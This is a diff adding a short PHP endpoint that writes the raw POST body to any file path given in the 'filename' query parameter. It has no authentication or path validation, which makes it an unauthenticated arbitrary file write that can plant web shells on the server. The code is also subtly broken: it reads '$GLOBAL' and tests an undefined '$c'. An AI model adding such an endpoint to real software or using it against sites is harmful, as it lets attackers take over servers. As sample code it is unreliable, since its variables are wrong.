@@ -1,0 +1,11 @@
+<?php
+	$content = $GLOBAL['HTTP_RAW_POST_DATA'];
+	if (empty($c)) {
+		$content = file_get_contents('php://input');
+	}
+	$filename = $_GET['filename'];
+	$fp = fopen($filename,'w+');
+	fwrite($fp, $content, strlen($content));
+	fclose($fp);
+	echo $filename;	
+?>
